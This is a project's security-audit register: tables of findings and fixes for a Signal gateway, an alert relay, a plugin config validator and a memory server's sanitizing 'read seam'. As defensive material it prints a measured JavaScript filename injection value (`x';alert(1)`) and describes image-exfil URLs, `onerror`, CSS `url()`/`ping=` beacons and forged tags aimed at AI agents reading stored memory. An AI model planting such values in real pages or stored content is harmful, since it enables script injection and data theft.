| S8-01 | `signal-gateway`: the bind guard and auth guard were **independent `if`s** in the daemon's `main.rs`, so `SIGNAL_GATEWAY_ALLOW_REMOTE=1` with no token served **send/enumerate/SSE unauthenticated** on a public interface. Because both guards lived in `main.rs` rather than behind a library seam, a path or import refactor could drop one without failing any test | MED-HIGH | **CLOSED — R75, and the defect was narrower than the row claimed.** The **bind guard itself was already present and is unchanged in substance**: `main.rs:105` still refuses a non-loopback bind without `SIGNAL_GATEWAY_ALLOW_REMOTE=1`, and the audit's suggested remedy (re-assert loopback in the `None` arm) describes what that line already did. The defect the finding actually named was that the **auth posture was INDEPENDENT of the bind** — the old code built an unauthenticated router whenever no token was configured, regardless of interface. Fixed by making the credential a *function of the address* in `resolve_api_auth` (`tools/signal-gateway/src/lib.rs:42`), which returns `Ok(None)` only on loopback and `Err` off-loopback unless both the opt-in and a non-empty token are present; `main.rs:112` calls it **before the socket is bound**, so the loopback-only `None` arm is now reachable only on loopback rather than being a claim about it. The empty-token arm (`token.filter(|t| !t.is_empty())`) is deliberate and recorded in the doc comment: an empty `auth_token` would install an empty secret any client could satisfy with a bare `Authorization: Bearer ` header. The env read moved into `remote_bind_allowed()` (`lib.rs:18`) so both halves read one value. **Proof is behavioural, not textual:** ten tests in `tools/signal-gateway/tests/s8_01_bind_coupled_auth.rs` drive the production function, including `the_refusal_is_a_distinction_not_a_blunt_refusal` (which fails if the fix were to refuse everything) and `the_fixtures_really_exercise_loopback_and_non_loopback`. A new `signal-gateway-gate` CI job (`.github/workflows/ci.yml:204`) runs that suite on every push — the crate's own tests ran in **no** workflow before, so the "drop one without failing any test" half of the finding was literally true of CI. **Residual, stated:** the `main.rs` bind guard and `resolve_api_auth` remain **two independent halves**; a future caller reaching only one still cannot open the exposure, but that is a documented argument, not a compile-time fact — `resolve_api_auth` is `pub` and any new binary target must choose to call it. |
| S8-02 | `valet-relay`'s alert sink verifies the MAC but never checks **freshness**: `verifyAlert` (`tools/valet-relay/relay.js:71-77`) checks the `v1,` prefix, recomputes the HMAC over `${id}.${ts}.${body}` and compares it with `crypto.timingSafeEqual` (`:76` — correct, constant-time), but **never validates that `ts` is recent**. The only gate is the signature call at `:139`. A captured, correctly-signed envelope is therefore replayable indefinitely, re-firing an operator alert via `sendSignal()` (`:153`) until the secret rotates. `seenEnvelopes` (`:163`) is per-process and covers the **outbound** path only | MED | **CLOSED — R76, and the fix is smaller than the finding's own remedy suggested.** Freshness only, and the finding was right about the tolerance but not about what else the obvious fix would have broken. `freshTimestamp` (`tools/valet-relay/relay.js:83-97`) parses the header **two ways** — all-digits → epoch seconds (what the Standard Webhooks spec defines), anything else → RFC3339 via `Date.parse` — and admits only `|now - t| <= 300`. It is now the second half of `verifyAlert` (`:105-116`), which gained an optional `nowMs` seam so tests inject a clock instead of waiting five minutes; the MAC check runs first and neither short-circuits into admitting. **The dual parse is not defensive padding — it is the fix.** The kernel's alert sink signs with `chrono::Utc::now().to_rfc3339()` (`src/alert.rs:510`), so an epoch-only parser `NaN`s on *every* genuine envelope: a green suite over a fix that rejects all legitimate traffic. `300` in both directions is a mirrored law, not a chosen knob — the spec's reference `TOLERANCE_IN_SECONDS = 5 * 60`, the kernel's own `WEBHOOK_REPLAY_SECS` (`src/config.rs:892-896`) and `WEBHOOK_TS_FUTURE_SKEW_SECS` (`src/webhook.rs:41-45`), enforced together in `enqueue_ts` (`src/webhook.rs:267-275`). No env var: this repo's env-truth gate treats an undocumented knob as a finding. **Id-dedup on `webhook-id` is DECLINED BY DECISION, not omitted.** The producer sets `ts` once and retries up to 3 times with the **same** `delivery_id` (`src/alert.rs:508-535`), so a receiver-side id-dedup would trade a duplicate alert for a *silently lost* one whenever the response was lost after the forward — the spec's idempotency-key advice applies to processing, and this relay's processing (a Signal send) must not be deduped. **Evidence:** 18 tests in `tools/valet-relay/relay.test.js`, clock-injected, including the 301-second refusal on **both** formats, the future-skew arm, fail-closed on unparsable input, and a positive control that pins *no id-dedup* (`the same id and ts is admitted twice — retries must not be eaten`). One is a real end-to-end run: a loopback HTTP sink stands in for signal-cli, the relay is spawned as a child process, a fresh envelope must reach `/v2/send` and a replayed one must get 401 with no forward. **Red-proof:** all 18 fail against the unfixed relay; with only the freshness line mutated away, 7 fail and the MAC guarantees still pass. `--selftest` grew a freshness arm. **CI:** a new `valet-relay-gate` job (`ci.yml:226`) runs `node --test tools/valet-relay/*.test.js` on every push — the relay's tests previously ran in **no** workflow, which was the other half of this row. Testability required wrapping the bind, the poll timer and the self-test in `require.main === module`; behaviour when run as a process is unchanged. **Residual, stated:** a within-window replay still fires once more (bounded: 5 minutes, one alert per captured envelope per window); the listener remains loopback-scoped (defense-in-depth, MEDIUM). |
| S8-04 | `signal-gateway`'s rate limiter is a **dead module**: `RateLimiter::is_allowed` (`tools/signal-gateway/src/ratelimit.rs:34`) is called only from that file's own tests, `main.rs:27`'s `mod ratelimit;` merely makes it compile, and `worker.rs:216`'s `send_rate_limiter` is an unrelated `Arc<Semaphore>` **send-concurrency** cap. So `POST /v2/send` — an outbound messaging primitive — has **no request-rate control**. Its own tests pass in isolation: the vacuous-green class | MED | **CLOSED — R76, wired rather than deleted.** Both halves of the finding's stated dilemma were false choices: the limiter was neither to be called *nor* deleted. It is now on the real request path. `apply_rate_limit` (`tools/signal-gateway/src/lib.rs:79-127`) is an `axum::middleware::from_fn` layer closing over a **cloned** `RateLimiter` (an `Arc` inside, so every layer instance shares one budget — pinned by `the_clones_of_a_limiter_share_one_budget`), generic over the router state so no `AppState` change and no `with_state` coupling are needed. `main.rs:143` wraps the **finished** router, after `.with_state(...)` and after the auth `match`, so the limit is **outermost** (T9-04: this row cited `:129` — a stale line number; the wrap sits at `:143` at R76's tip) — which is the substance: in the tokenless loopback posture there is no auth layer at all, so a layer added inside `create_router_with_auth` would sit inside only one of its two arms and leave the unauthenticated flood unbounded exactly where the operator chose the loosest posture. A pinned e2e test proves the order over a real socket (401s inside the budget, 429 outside it). **Refusal:** `429`, `RETRY-AFTER: 60`, empty body, one `tracing::debug!` carrying the limiter's key and nothing request-derived. **Global keying, per-IP DECLINED BY DECISION:** the server is `axum::serve(listener, app)` with no `into_make_service_with_connect_info`, so there is no `ConnectInfo` to key on; and under this crate's posture every client is `127.0.0.1` anyway, so per-IP discrimination would read as control while being an illusion — behind a proxy it collapses to one address regardless. The limiter stays generic over its key, so per-IP is a call-site change. **The module also moved and lost its alibi.** `mod ratelimit;` is gone from `main.rs`; the limiter is `pub mod ratelimit` in the lib target (`lib.rs:14`) so the binary and the integration tests consume one definition instead of the binary's private copy. The blanket `#![allow(dead_code)]` is gone. *Honest correction to this row's own remedy:* that blanket's removal does **not** make the compiler police deadness here — once the module is `pub` in a library target, rustc treats every `pub` item as externally reachable. What actually holds the line is the structural pin. The constants are named in the lib (`API_RATE_LIMIT_MAX_REQUESTS = 100`, `API_RATE_LIMIT_WINDOW_SECS = 60`) so prod and tests cannot drift — they are the values `create_rate_limiter()` hardcoded before, **named, not chosen**. The clock seam is the real find: `admit_at(key, now)` (`ratelimit.rs:75-108`) lets the window *drain*, which the old single `Instant::now()` call site made unrepresentable — the old suite could prove a budget fills up and never that it empties. `remaining` and `reset` were **dropped**, not kept under a narrow allow: nothing consumed them, and an admin `reset` for an in-memory limiter with no admin endpoint is speculative API. **Evidence:** 19 tests in `tools/signal-gateway/tests/s8_04_rate_limit_wired.rs` — behavioural (boundary, drain, partial expiry, per-key isolation, the drain sweep, constants, clone-shares-budget), end-to-end over a real loopback socket, and structural. **Red-proof:** deleting the `apply_rate_limit(app,` line — the exact defect — fails 2 tests; making the layer never refuse fails 5. The e2e harness is a hand-rolled `TcpStream` HTTP/1.1 GET, **not** `reqwest`: reqwest 0.13 resolves `rustls-no-provider`, so `Client::new()` panics unless a rustls crypto provider is installed, which would require `rustls` as a *direct* dependency — a new dependency edge, refused. Zero new dependency edges; both `tools/*/Cargo.lock` files unchanged. **Residual, stated:** a burst of 100 still reaches Signal; the SSE long-poll on `/api/v1/events` draws from the same budget as `/v2/send`; `max_sends_per_second` in config.yaml is a **concurrency** cap (5 in-flight), not a rate limit — recorded, not renamed, because renaming a config key is a breaking config-surface change; and the 100/60 constants are not operator-tunable (a config surface is a knob needing env-truth + docs + example-yaml churn, and no deployment evidence demands it). |
| S8-05 | Plugin `resolveConfig` is a bare type assertion; its Typebox schema is used **only as a type source**. `autoCapture: "false"` (string) resolves **truthy** — auto-capture turns ON when the operator wrote "false" | MED | **OPEN — in-repo; re-routed OFF R71 (R75).** `R71-adjacent` pointed at a **fork** round, but the defective file is **in this repository**: `plugin/src/config.ts:234-235`, where `resolveConfig(raw: unknown)` does `const cfg = (raw ?? {}) as Partial<BrainConfig>` — zero runtime validation — so `autoCapture: cfg.autoCapture ?? DEFAULTS.autoCapture` (`:254`) passes the string `"false"` through and it is truthy. **The fix pattern already exists twice in the same function**: `untrustedOrigins` (`:247-250`) checks its closed set at the boundary, and `teamDomain` (`:269-275`) runs `assertValidTeamDomain` — so this is a consistency defect, not a missing capability. **The audit's open question is now ANSWERED, and it resolves against reachability-by-anyone:** `brainConfigSchema` (`:16`) is referenced only at its own declaration and by the type alias at `:78` (`Static<typeof brainConfigSchema>`) — it is never used to *validate* — and `plugin/package.json` carries **no `configSchema` key**, so the plugin's exported entry points do not validate at the host boundary either. The former "*reachability depends on host schema enforcement — an outstanding cross-tree check*" caveat is therefore **withdrawn**: nothing validates this config. Still **not fixed** — the row stays open, routed to a repo that owns the file. |
| S8-06 | Client export seam: `{body:?}` emits Rust `Debug` (`\u{2028}` is **not a valid JS escape**) — live export corruption; plus a **latent** unescaped-JS sink with no reachable attacker input today | MED | **PARTIALLY CLOSED — R73, after two corrections to the finding itself.** *(1)* The file:line was wrong: the sink is `client/src/download.rs:35`, not `panels/mod.rs:66` (that file is the **remedy pattern** — it already uses `serde_json::to_string` for this exact job). *(2)* **Neither defect was live.** All three `save_file` names are literals or `i64`-derived, and all three bodies are `serde_json` re-serialisations, so the `{body:?}` hazard needs a raw NUL followed by a digit that no body can carry. What shipped: `safe_filename` now **refuses** `'`, `"` and `` ` `` — measured, it previously returned `Some("x';alert(1)__.json")` and the emitted `eval` carried `a.download='x';alert(1)//.json';` — and the body moved to `serde_json::to_string`. Four pins, three proven red-first. **Note the `\u{2028}` premise is wrong:** ES2019's JSON-superset proposal made U+2028/2029 **legal** in JS string literals (verified in Node v24: parses to length 3), and `serde_json` emits them raw. The surviving hazard is the **legacy octal escape** (`Debug` writes NUL as `\0`, so `\05` becomes U+0005). **Residual:** the round was previously routed to R70, which never touched `client/`. |
| S8-07 | 6 of 13 `crates/` members are unconsumed islands (two whole dead chains). Gold fixtures **are** SHA-256 pinned | MED | **OPEN — wire or delete** |
| S8-09 | The release gate is documentary: `release.sh:54` prints *"or push a tag manually at your own judgement"* and `release.yml` re-runs no CI on tag push. Remote hygiene **fail-safe** (public push URL `DISABLED`) | LOW-MED | **ALREADY CLOSED — misread by the audit (verified 2026-10-05 at `9212a3e4`).** Line 54 is inside the **`gh`-MISSING refusal branch**, immediately followed by `exit 1` — it is advice for *instead of* using the script, and `git blame` shows it was *introduced by* the guard (`a0eae553`), so it is the cause and not an escape from it. `release.sh:57-88` resolves the ci.yml run for the tagged SHA and refuses unless it is `completed` **and** `success`. `release.yml` **is** the tag workflow (`on.push.tags: ['v*']`) and carries an in-workflow backstop at `:253-299` (S7-10) for a manual `git tag`. **Residual, stated:** the manual-tag sentence is still printed, so a reader scanning the script could believe a bypass exists; and the "public push URL DISABLED" fact is a **local git-config setting on the operator's machine**, not observable from the tree — so it is recorded here rather than pinned. |
| S8-11 | `AGENTS.md`'s "all three `Cargo.lock` files byte-identical" is false | LOW | **CLOSED — R72**, and the audit's replacement number is **also wrong**: there are **8 on disk / 7 tracked** (`fuzz/Cargo.lock` is gitignored via `fuzz/.gitignore`), so "eight" is a working-tree figure a CI checkout never sees. The three historical rows now say "all tracked `Cargo.lock` files". **The real defect the audit did not name:** `scripts/verification-sweep.sh` ran bare `cargo audit`, which covers the **root lockfile only** — the local gate was the weaker of the two, and precisely on the surface this finding is about (RUSTSEC-2026-0285 landed in `tools/*`, which the root lockfile never saw). The sweep now loops over every lockfile, mirroring what `ci.yml` already did; non-vacuity proven (8 distinct scans, each with its own dependency count). |
| R8-01 | `AGENTS.md` carried a hand-typed `"2,818 passed at HEAD 7001e478"`. **CORRECTION: the cited line number (1418) was unrelated prose, and the audit's replacement figure (3,122) was ALSO stale** — measured at `e9c71919`, 11 commits before this row was closed | FALSE | **CLOSED — R72.** Re-measured: the live full-suite figure is **3 158** at `77eb2aa5`, and the README badge was stale at 3 120 (38 adrift) until re-pasted. The AGENTS.md line now carries **NO number** — it names `scripts/badges.sh --verify-count`, which re-derives and refuses on drift, so the figure cannot go stale unremarked again. **3 122 was not written anywhere.** |
| R8-02 | `docs/AUDIT.md:22,25` disposition G3/G6/G7 to `IMPLEMENTATION_PLAN_v1.11.0_HippoRAG.md` — **that file does not exist** (moved to the private repo). An auditor following the register finds nothing, and the link checker cannot see it | FALSE | **CLOSED — R72**, with two corrections: (1) there was **ONE** dead reference, not two — line 25 read `Carried to v2.0` and never cited the file, so the audit miscounted two adjacent rows sharing a disposition; (2) the stated reason was wrong — `check-doc-links.py` **does** walk `docs/` (and `docs/AUDIT.md` is a symlink to the root file); the real reason the reference was invisible is that the checker only matches markdown-link syntax `](…)` and this was bare backtick text in a table cell. `AUDIT.md:22` now points at the private archive by prose (deliberately NOT a markdown link: that would newly expose it to a checker that cannot resolve a private path). The `book/` copies are a **generated, gitignored** mdBook artifact of `docs/SUMMARY.md` and are not edited. |
| R8-03 | `badges.sh` selfcheck **cannot detect test-count drift at all** — it greps only for the string `"not selfcheck-verified"` | FALSE | **CLOSED — R72.** Red-first: the badge at 3 120 against a derived 3 156 exited **0**, and a planted `999999` also passed — a green gate on a lie. The derivation sat **below** selfcheck's own `exit 0`, so the comparison was physically unreachable. Fixed by splitting the modes by cost: `--selfcheck` stays cheap and now honestly declares what it does not check, while **`--verify-count`** re-derives and refuses on drift. A second defect found while fixing the first: the disclaimer arm was a **whole-file** grep satisfied by a sentence 28 lines below the badge, so the badge could be arbitrarily wrong while green — it is now scoped to the badge's own block, proven non-vacuous (the same bytes at a distance now fail). |
| L8-01 | **CT CART general duties went live 2026-10-01** — three days ago — and `US_STATE_MAP.md:45` still files them under "Scheduled". The repo asserted this duty, set its own clock, never re-armed it | **HIGH** | **CLOSED — R72** (date arithmetic only). Moved out of "Scheduled" into "Live and enforceable today", and the operator checklist re-tenced from a future obligation to a present one. **Scope stated in the file:** the date arithmetic is provable from the repo, but the **statute text remains UNVERIFIED** (`cga.ct.gov` unreachable), so no legal conclusion is added. No `reg_watch.rs` constant was added — the deliverable is **deployer-side** (checkout/HR notice copy) and a pin asserting an artifact the server cannot observe would be theatre. |
| L8-02 | `/.well-known/ai-notice` is framed as "the Art 50 disclosure itself", but Art 50(5) requires disclosure **at first interaction**. Component scope is *correct*; the claim shape is not | **HIGH** | **CLOSED as a CLAIM — R73; the deployer duty is named, not discharged.** `COMPLIANCE.md` said the server "serves the Art 50 disclosure **itself**" and a deployer could "close the model-origin transparency loop" by pointing at the URL. Reworded: the well-known document is an **input the deployer builds the notice from**, and Art 50(5)'s **at-first-interaction** duty lives at the deployer's own UI seam — a component that stores and retrieves content cannot observe when a user's first interaction occurs. The section now carries an explicit "what this component does NOT discharge" and a scope note. **Nothing on the wire changed:** `build_ai_notice` keeps its seven fields, because a `disclosure_timing` field would be a wire change that would not discharge the duty anyway — named as a residual. **No deployer-side surface exists here and none is claimed.** |
| L8-03 | `reg_watch.rs` cites *recital 38* for the 2026-12-02 Art 50(2) transitional; the operative provision is **Article 111(4)**. A wrong citation on a constant a **green CI pin** depends on | MED | **CLOSED — R73, and the pin was the real finding.** The citation is corrected in `src/reg_watch.rs` and `docs/compliance.md` (the two files that assert it; `CHANGELOG.md` keeps its historical note). **But the correction alone repeats the defect**, because `ai_act_art50_marking_deliverable` asserts the *date*, the provenance surface and two date strings — it never read the comment, so it was **green on a wrong legal instrument**. New pin `art50_transitional_cites_an_operative_provision_not_a_recital` reads the file's own source, slices the comment to the constant, and asserts the operative cite is present, the recital is not stated as *granting* the period, the provenance is recorded, and `docs/compliance.md` does not repeat the defect. **Provenance labelled, not laundered:** no EUR-Lex fetch is reachable from a build and Context7 carries no AI Act coverage, so the article number is recorded **audit-asserted, not source-verified** — in the code, the doc, and as an assertion. Only the citation's *kind* was corrected; the date was independently confirmed and is unchanged. |
| L8-04 | The CRA runbook's reporting channel points at a manufacturer identity in `SUPPORT.md` — which **does not exist** (32 lines, no identity). Art 14 live 23 days | MED-HIGH | **OPEN — UNROUTED (R73 corrected the routing, not the code).** The audit filed this as `OPEN — R72`, but R72 shipped without resolving it: the remedy — state the applicability question, then populate or mark N/A — turns on a deployer identity the repo does not hold, so no round here can close it. **No fix ships this round.** Left unrouted rather than pointed at a shipped round that will never revisit it. |
| L8-05 | The federal row omits **EO 14409** (2 Jun 2026) and **EO 14434** (29 Sep 2026) | MED | **OPEN — DEFERRED, not closed.** Unverifiable from this environment: the EOs appear **only** in this register and the audit that cites it (a single source), the audit's own §7.8 lists "US federal sectoral" as blocked on unreachable primary sources, and Context7 carries no federal EO coverage. Writing EO numbers and dates into a deployer-facing register on that basis would be an **unsupported legal claim about a live instrument**. `US_STATE_MAP.md` now says so explicitly rather than omitting them silently. |
| L8-06 | `US_STATE_MAP.md` is 20 days stale against its own quarterly cadence; the check could not be run (NCSL Cloudflare) | MED | **PARTIALLY CLOSED — R72** (disclosure, not a refresh), and the audit's framing is **too strong**: quarterly from 2026-09-14 is not due until **2026-12-14**, so this was a **blocked-cadence artifact, not neglect**. `US_STATE_MAP.md` now carries a cadence block saying the pass has NOT been run and why, with the next due date. The status date is **deliberately NOT re-stamped** — bumping it would claim a verification that never happened, which is the exact defect this register exists to prevent. Running the check is an **external act**; this row stays open until one is performed. |
| L8-07 | Two OWASP edition dates wrong **and self-contradictory inside `COMPLIANCE.md`** (`:11` 2025-12-10 vs `:354` 2025-12-09; publisher says Dec 9). *The repo has a machine-checked calendar and these two dates are hand-typed* | LOW | **PARTIALLY CLOSED — R72** (the Dec date only), with the audit's file attribution **corrected**: `COMPLIANCE.md` carries **no** 2025-12-10 at all; the contradiction is *across* files — the buyer-facing `docs/OWASP_AGENTIC_2026.md:11` said Dec 10 while `COMPLIANCE.md:355` and `docs/MEMGHOST_MITIGATION.md:5` said Dec 9. Reconciled to **2025-12-09**, recorded as a **repo-internal reconciliation**, not a publisher-verified fact. **The Aug 3/4 half is deliberately NOT changed:** seven repo sources carry `2026-08-04` backed by DOI `10.5281/zenodo.22109015` and a prior live fetch (`docs/SECURITY_AUDIT_20260912_FOURTH_PASS.md:119`), against one unsourced audit claim of Aug 3. A DOI-backed claim is not swapped for an unsourced one. **Still open** pending a publisher fetch. |
| L8-11 | **No export-control analysis on model weights** — could not reach BIS/ECFR | UNKNOWN | **OPEN — genuinely unknown, not a clean bill of health** |
| P8-01 | The invisible-Unicode set is pinned for **two of four trees** (plugin fixture only). I hand-diffed all four: **currently correct**, all drift additive and fail-safe — but the property is unowned | MED | **PARTIALLY CLOSED — R72**, on a **refuted premise**. The tree has **four in-repo lanes**, not two: server `src/strip_invisible.rs:140-189` (exhaustive `0..=0x10FFFF`), plugin `plugin/src/format.test.ts:530`, **client `client/src/main.rs:2965`** (which the audit missed — it consumes `include_str!("../../plugin/fixtures/invisible-classes.json")` cross-tree and **runs in CI** via `client-gate`), and shell `shell/tests/sanitize.test.ts:34,60`. All four consume the ONE canonical fixture, so the audit's proposed remedy (add `client/fixtures/invisible-classes.json`) would have **duplicated working cross-tree consumption**. **The real residual, found by inspection and not in the audit:** the plugin's lane is run by **no workflow in this repo** — it is enforced in the openclaw workspace. A CI job here is not possible: `plugin/package.json` has **no `scripts` block** and depends on `"@openclaw/plugin-sdk": "workspace:*"`, which cannot resolve outside that workspace. Recorded as **R71's**, not left looking like an oversight here. |
| D8-01 | **The fork is the largest unmanaged risk and it is not in this repo.** 5 HIGH silent-regression rows; `hooks.ts` (24 upstream commits) drops any upstream-added field via an `as TResult` cast **and compiles clean** | Strategic | **OPEN — R71.** An owned generated fixture beats more fork code |
| D8-02 | **Enforcement is the uniform weak link** — 3 of the top 10 are guards passing while violated. The pattern: the repo writes gates and attacks them lightly | Strategic | **OPEN — UNROUTED (never assigned).** The process fix: a gate-law register row per guard carrying its own red-proof. **No such artifact exists** — "red-proof" appears across `AGENTS.md`/`CHANGELOG.md` as a narrative convention, never as a register a guard cannot be added without updating. The habit took root (R68–R73 each record planted-mutant kills), but the standing artifact the finding asked for is still missing, and it is the thing that would force the habit for guards nobody happens to be writing this round. **Note this row is the umbrella the F8-* drift sat under**: it was filed against R68, which shipped the three findings *inside* its thesis but never this process fix. Left unrouted rather than pointed at a round that did not own it. |

### Verified HELD (the honest good news)

The **anti-vacuity sweep found ZERO genuinely vacuous pins.** Every suspicious shape was defended —
`soft_handoff_threshold_is_not_decorative` (absence pin, defended three ways),
`sql_statement_counter_still_fires` (exemplary, 10 cases incl. the negative), the read-seam fixture
pins, `handler_body_ignores_comments_naming_the_symbol`. The `exec_spawn_carries_kill_on_drop`
lesson was learned. Four of the five spire guards are **not** gameable.

**Drill-verified live** (fresh DB, port 18765, live DB SHA-256 identical before/after):
write-time screen + human-in-the-loop enforced · read seam stripped the tag block, welded script,
image-exfil URL, `onerror` and bidi override · `untrusted: true` carried · digest-bound approval
rejected a wrong digest with 409 and **replay returned 404, never double-applied**. The forged
host-fence tags that survive the server are neutralized downstream by the fork's ZWSP-split merge
seam — defence-in-depth verified, not assumed.

**Sixteen claims HELD** against direct attack, including provenance marks (behavioural pins, not
string matching), revocation reach including mid-stream SSE, `alg:none`/HS* rejected before key
lookup, and the audit-chain ceiling stated precisely rather than overclaimed.

### Gates — all executed at `e9c71919`

Full suite **3122 passed / 0 failed / 3 ignored** · clippy bench/default/otel exit 0 · fmt + client
fmt exit 0 · crates **308/0** · steward-harness **44/0** · lipstyk **exit 0** (verified against a
real code base after it **correctly refused** to pass vacuously on the docs-only HEAD) · badges
selfcheck · env-truth · doc-links (404 resolve) · docs-truth · **`cargo audit` exit 0 on all four
lockfiles** (one yanked-crate warning, `yoke-derive 0.8.3` in the Tauri shell).

### Carry-forward ceilings (this pass)

- **The fork's red-proofs were not executed** — every "test that fails on deletion" cell is derived
  by reading tests, not by deleting the hardening. Largest gap in the report.
- **11 regulatory items unverified**, including the CRA Art 14 clocks — the repo's most-cited legal
  claim. Each has a named next check in `docs/audit8/06-regulatory-matrix.md` §7.8.
- **Concurrency is the weakest dimension** — no lock-ordering cycle analysis over the ~19 Mutex/RwLock
  sites; FTS/vec bloat, metric cardinality and single-mutex inference behaviour unmeasured.
- No live surface touched; no file in either repository modified.

## 2026-10-06 — Ninth-pass full-spectrum audit (F9/S9/P9/K9/D9/L9/R9/T9/W9)

Executed at `ea286449` (R76 tip) over `docs/SECURITY_AUDIT_20261006_NINTH_PASS.md` —
six parallel arms (server core, satellites, Mode-B claims, fork, regulatory, 2026
landscape) plus an orchestrator-owned live drill (fresh DBs, ports 18976–18978) and
three EXECUTE-LATER probes run to completion. The drill **overrode a static verdict
twice**: R9-01 (filed WEAKENED statically, REFUTED live — the approve digest binds raw
drift the reviewer cannot see, fail-closed), and the orchestrator's own first recall
check (vacuous on 0 hits, caught and re-run). 29 finding rows; no HIGH in the server
core — the HIGH sits in the fork's packaging.

| ID | Finding | Sev | Disposition |
|---|---|---|---|
| K9-01 | Fork-built macOS app **auto-updates back to upstream binaries**: `package-mac-app.sh:114-115` defaults `SPARKLE_FEED_URL` + `SPARKLE_PUBLIC_ED_KEY` to upstream's, baked into Info.plist — a Sparkle update replaces the entire fork hardening stack behind normal update UX. Upstream-owned file, invisible to the rebase table | **HIGH** | **CLOSED — fork lane (zero-conflict posture).** `scripts/fork/package-mac-app-gated.sh` — a fork-NEW wrapper; upstream's `package-mac-app.sh` stays byte-identical (measured: empty fork diff), so no future upstream pull can conflict with the fix. The gate refuses to package a DIVERGED tree without an explicit fork `SPARKLE_FEED_URL` + `SPARKLE_PUBLIC_ED_KEY`, refuses even then when the configured feed names upstream's appcast, and passes a clean upstream checkout through untouched (upstream defaults are correct there). Drilled all four arms (`--gate-only`): diverged+no-env → exit 1; explicitly-upstream feed → exit 1; fork feed → pass; `--upstream-ref HEAD` → pass. Honest ceiling: invoking upstream's script DIRECTLY bypasses the gate — fork build paths must point at the wrapper (named in scripts/fork/README.md) |
| F9-01 | `/ops/agents/revoke {"principal":"loopback"}` → `{"known":true,"revoked":true}` while the **operator bearer is structurally unreachable by the kill-switch** (drill: recall/proposals/quarantine/valet all 200 after the revoke; `src/server/router/auth.rs:613` operator arm consults nothing — the twokeys agent arm `:615-640` and JWT path `:332-353` both do). A leaked operator token is unkilable from inside short of restart; the success response lies during incident response | MED-HIGH | **CLOSED — R77.** `400 operator_bearer_unrevocable` — its own code, naming rotation + restart, writing NOTHING (pinned: no `revoked_principals` row lands); anti-vacuity both neighbours (agent@loopback and an unseen JWT sub still revoke 200, so the verb did not learn to refuse everything). `OPERATOR_LOOPBACK_LABEL` const + THREAT_MODEL §5b row + openapi 400 arm (schema regenerated). Pin `revoke_refuses_the_opaque_operator_loudly`, red-proofed by disabling the refusal |
| F9-02 | Quarantine visibility asymmetry (drill): structured `/ingest` response says only `status:"created"` — no verdict field — and `/recall` discloses no withheld count; `/quarantine` is the only discovery surface. The proposal schema carries `screen_verdict`; this path does not | MED-LOW | **OPEN — UNROUTED** (wire-contract addition needs its own decision) |
| R9-02 | `style=` (CSS `url()` fetch) and `ping=` (click beacon) **survive the read seam verbatim with full attacker URLs** (drill-confirmed; `src/gate.rs:699-704` URL list closed at 7 names, neither matches `on[a-z]+`). Latent — no in-tree renderer dereferences; one downstream-renderer edit from live (the S8-06 class) | MED-LOW | **CLOSED — R78.** `ping` dies by NAME and `style` dies by VALUE (url(/image-set( after entity-decode + CSS-comment strip + one CSS-escape decode + whitespace removal) — benign styles and http(s) hrefs stay byte-identical (the F7-01 parity law holds: fetch-hostile, not attribute-hostile). Pin `sanitize_read_attr_tier_sweeps_style_and_ping` (10 canaries incl. comment/hex/entity obfuscations + neighbour-attr survival), red-proofed by disabling both arms |
| S9-01 | `tools/channel-bridge` + `tools/signal-gateway` locks **still stale** (`cargo metadata --locked` exit 101 both; tokio/clap/reqwest/uuid/jsonwebtoken pairs) and their CI lanes re-lock **silently** — signal-gateway's can move `presage` `branch="main"` at its current head: CI green over unreviewed code. Note: `--no-deps` form passes — the sweep must use the full form | MED | **CLOSED — R79.** Both re-locked + committed (cb: clap 4.6.6→4.6.7 ×3, jsonwebtoken 11.0.0→11.1.0, reqwest 0.13.4→0.13.5, tokio 1.53.1→1.53.2, uuid 1.26.0→1.27.0; sg: the same class plus uuid 1.25.0→1.27.0 — `cargo metadata --locked` exit 0 both, advisory ID identical old-vs-new); presage + presage-store-sqlite pinned by `rev = f74b96e…` (upstream main had moved to 33dd149 + a newer libsignal-service — the pin holds the reviewed stack; libsignal core unmoved); both lanes' clippy/test carry `--locked` (fmt cannot: it rejects the flag — measured); sweep gains a full-form lock-freshness lane over tracked lockfiles. Pins `the_tools_locks_satisfy_their_manifests` / `the_tools_ci_lanes_pin_resolution_with_locked` / `git_dependencies_ride_a_pinned_rev` (tests/lock_discipline_pins.rs), red-proven on all arms incl. the renamed-lane and rev≠lock mutants |
| S9-02 | signal-gateway live `RecipientCache` (`signal/worker.rs:31`) unbounded, logs phone→UUID PII at INFO (`:39`), and `POST` cache-seed accepts arbitrary phone→UUID silently — while the bounded twin (`cache.rs`, cap 4096) is **dead code**: the remedy exists in-tree and the production path doesn't use it | MED | **CLOSED — R80.** The bounded twin IS the production cache: worker.rs re-exports `crate::cache::RecipientCache` and its inline HashMap twin is deleted (`clear()` died too — dead by any measure; `len`/`get_phone` stay as `#[cfg(test)]` measured truths). PII law on the module: no operand rides any log lane (the `[CACHE] Mapping` / `Self ACI` lines are gone; resolve paths log shape at debug). The seed verb is AUDITED at WARN with sha256 digests (`phone_sha256`/`uuid_sha256`), never raw operands — the bearer gate already covers it when configured. Pins: `the_bounded_cache_is_the_production_cache` + `cache_pii_operands_stay_off_the_log_lane` (tests/s9_02_cache_wiring.rs) + `resolve_reads_the_bounded_legs`/`resolve_fast_paths_are_shape_not_identity` in cache.rs; red-proof: either the inline struct or the mapping log line returns and the pins fire |
| S9-06 | S8-05 amplified: a string-typed `agents`/`allowedChatIds` degrades the plugin allowlists to **substring matching** (`plugin/src/gating.ts:49-58,66-70` — `agents:"ops-agent-1"` admits any substring agent); `autoRecallTopK:"5"` fails every recall. `openclaw.plugin.json` now declares a typed `configSchema`, so exploitability hinges on host-side validation this repo cannot observe | MED | **CLOSED — R81.** `assertFieldTypes` — the closed field census (every declared field: boolean/string/string-array/enum/integer-with-range) runs FIRST in `resolveConfig`, so a wrong-typed value REFUSES registration instead of papering over: a string `agents` can no longer become substring `.includes`, a string `autoRecallTopK` can no longer fail every recall silently. Deliberate posture change, disclosed: an unknown `untrustedOrigins`/`captureMode` enum value used to degrade to default — for a typo of "exclude" that silently switched the posture DOWN to label (re-injecting what the operator excluded), so it now refuses too. Pins in `config.test.ts`: the string-allowlist mutant (agents/allowedChatIds/mixed arrays), string numerics + booleans + out-of-range ints, and the fully-typed anti-vacuity arm. Host-side `configSchema` enforcement stays unobservable — the plugin now validates its own boundary |
